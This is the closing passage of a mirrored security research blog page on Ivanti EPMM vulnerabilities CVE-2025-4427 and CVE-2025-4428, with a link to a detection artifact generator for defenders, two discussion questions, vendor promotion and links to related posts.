&#x27;csv&#x27;.&quot;]&#125;]&#125;<br><br></code></pre></td></tr></table></figure><p>As with all our research, we understand the need to help our brothers in arms (Incident Responders, SOCs, CERTs) - especially when there’s in-the-wild exploitation.</p><p>So, we hope the following <a target="_blank" rel="noopener" href="https://github.com/watchtowrlabs/watchTowr-vs-Ivanti-EPMM-CVE-2025-4427-CVE-2025-4428?ref=labs.watchtowr.com">Detection Artifact Generator on Github</a> is helpful.</p><p><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_13.jpg"></p><h2 id="Some-Questions-For-The-Reader"><a href="#Some-Questions-For-The-Reader" class="headerlink" title="Some Questions For The Reader"></a>Some Questions For The Reader</h2><ol><li>Is this really an Authentication Bypass or, an Order of Operations vulnerability?</li><li>Is this really a vulnerability in a third-party library, or incorrect and dangerous usage of known-scary functions?</li></ol><p><img src="http://www.18k.icu/images/20250625_07_1oixunqn/img_14.jpg"></p><p>At <a target="_blank" rel="noopener" href="https://www.watchtowr.com/?ref=labs.watchtowr.com">watchTowr</a>, we passionately believe that continuous security testing is the future and that rapid reaction to emerging threats single-handedly prevents inevitable breaches.</p><p>With the watchTowr Platform, we deliver this capability to our clients every single day - it is our job to understand how emerging threats, vulnerabilities, and TTPs could impact their organizations, with precision.</p><p>If you’d like to learn more about the <a target="_blank" rel="noopener" href="https://www.watchtowr.com/?ref=labs.watchtowr.com"><strong>watchTowr Platform</strong></a><strong>, our Attack Surface Management and Continuous Automated Red Teaming solution,</strong> please get in touch.</p><h3 id="Gain-early-access-to-our-research-and-understand-your-exposure-with-the-watchTowr-Platform"><a href="#Gain-early-access-to-our-research-and-understand-your-exposure-with-the-watchTowr-Platform" class="headerlink" title="Gain early access to our research, and understand your exposure, with the watchTowr Platform"></a>Gain early access to our research, and understand your exposure, with the watchTowr Platform</h3><p><a target="_blank" rel="noopener" href="https://watchtowr.com/demo/">REQUEST A DEMO</a></p><p>[Previous post</p><h4 id="SysOwned-Your-Friendly-Support-Ticket-SysAid-On-Premise-Pre-Auth-RCE-Chain-CVE-2025-2775-And-Friends-sysowned-your-friendly-rce-support-ticket"><a href="#SysOwned-Your-Friendly-Support-Ticket-SysAid-On-Premise-Pre-Auth-RCE-Chain-CVE-2025-2775-And-Friends-sysowned-your-friendly-rce-support-ticket" class="headerlink" title="SysOwned, Your Friendly Support Ticket - SysAid On-Premise Pre-Auth RCE Chain (CVE-2025-2775 And Friends)](&#x2F;sysowned-your-friendly-rce-support-ticket&#x2F;)"></a>SysOwned, Your Friendly Support Ticket - SysAid On-Premise Pre-Auth RCE Chain (CVE-2025-2775 And Friends)](&#x2F;sysowned-your-friendly-rce-support-ticket&#x2F;)</h4><p>[Next post</p><h4 id="Is-b-For-Backdoor-Pre-Auth-RCE-Chain-In-Sitecore-Experience-Platform-is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform"><a href="#Is-b-For-Backdoor-Pre-Auth-RCE-Chain-In-Sitecore-Experience-Platform-is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform" class="headerlink" title="Is b For Backdoor? Pre-Auth RCE Chain In Sitecore Experience Platform](&#x2F;is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform&#x2F;)"></a>Is b For Backdoor? Pre-Auth RCE Chain In Sitecore Experience Platform](&#x2F;is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform&#x2F;)</h4><p>watchTowr Labs © 2025</p><p><a target="_blank" rel="noopener" href="https://ghost.org/">Powered by Ghost</a></p></div></div><div class="footer" id="footer"><p>Copyright © 2025 <a class="flink" target="_blank" rel="noopener" href="http://www.18k.icu">www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style="vertical-align:sub"><input type="checkbox" name="switch" id="update_style"> <span class="el-switch-style"></span></label></p></div><input type="hidden" id="web_style" value="black"> <input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz"> <input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf"><script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js"></script><script src="/libs/highlight/highlight.pack.js"></script><script src="/js/js.js"></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>